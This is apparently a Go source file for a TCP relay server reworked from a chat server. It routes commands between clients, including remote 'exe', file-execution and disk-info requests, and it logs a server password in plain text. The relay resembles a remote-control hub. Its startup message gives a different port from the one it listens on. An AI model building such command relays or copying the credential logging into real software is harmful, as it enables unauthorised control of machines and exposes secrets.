package main

import (
	"./util"
	"bufio"
	"fmt"
	"github.com/mgutz/logxi/v1"
	"net"
	"regexp"
	"strings"
)


const LOBBY = "lobby"
func main() {

	listener, _ := net.Listen("tcp", "192.168.43.67:9000")
	log.Info("Chat server started on port :2222\n")

	for {
		conn, _ := listener.Accept()
		log.Info("Connection accepted")

		client:=util.ServerInfo{Connection:conn}
		log.Info("Client:",client.Connection.RemoteAddr())
		if client.Register() {
			channel := make(chan string)
			go waitForInput(channel, &client)
			go handleInput(channel, &client)
			util.SendClientMessage("ready", ":2222", &client, false)
		}

	}
}

func waitForInput(out chan string, client *util.ServerInfo) {
	defer close(out)

	reader := bufio.NewReader(client.Connection)
	for {
		line, err := reader.ReadBytes('\n')
		if err != nil {
			client.Close()
			return
		}
		out <- string(line)
	}
}


func handleInput(in <-chan string, client *util.ServerInfo) {

	for {
		message := <- in
		if (message != "") {
			log.Info("Message handle:",message)
			message = strings.TrimSpace(message)
			action, body := getAction(message)
			log.Info("Action:",action)
			log.Info("Body:",body)

			if (action != "") {
				switch action {

				case "goClient":
					log.Info("go name:",body)
					client.UserName=body


				case "message":
					log.Info("username:",client.UserName)
					util.SendClientMessage("message", body, client, false)


				case "serverUserName":
					client.UserName = body
					//util.SendClientMessage("connect", "", client, false)
				case "serverServerName":
					client.ServerName = body
					//util.SendClientMessage("connect", "", client, false)
				case "serverHost":
					client.Host= body
					//util.SendClientMessage("connect", "", client, false)
				case "serverPort":
					client.Port = body
					//util.SendClientMessage("connect", "", client, false)
				case "serverPassword":
					client.Password = body
					s:=fmt.Sprintf("%v:%v %v %v",client.Host,client.Port,client.ServerName,client.Password)
					log.Info(s)
					util.SendClientMessage("connect", s, client, true)
				case "getDiskInfo":
					util.SendClientMessage("getDiskInfo",body,client,true)
				case "postDiskInfo":
					util.SendClientMessage("postDiskInfo",body,client,false)
				case "exe":
					util.SendClientMessage("exe",body,client,true)
				case "postExe":
					util.SendClientMessage("postExe",body,client,false)
				case "filesExe":
					util.SendClientMessage("filesExe",body,client,true)
				case "postFilesExe":
					util.SendClientMessage("postFilesExe",body,client,false)
				case "close":
					util.SendClientMessage("remove"," ",client,false)
					client.Close()




				case "disconnect":
					client.Close()


				//case "ignore":
				//	client.Ignore(body)
				//	util.SendClientMessage("ignoring", body, client, false)


				//case "enter":
				//	if (body != "") {
				//		client.Room = body
				//		util.SendClientMessage("enter", body, client, false)
				//	}

				
				//case "leave":
				//	if (client.Room != LOBBY) {
				//		util.SendClientMessage("leave", client.Room, client, false)
				//		client.Room = LOBBY
				//	}

				default:
					util.SendClientMessage("unrecognized", action, client, true)
				}
			}
		}
	}
}

func getAction(message string) (string, string) {
	log.Info(message)
	actionRegex, _ := regexp.Compile(`^\/([^\s]*)\s*(.*)$`)
	res := actionRegex.FindAllStringSubmatch(message, -1)
	if (len(res) == 1) {
		return res[0][1], res[0][2]
	}
	return "", ""
}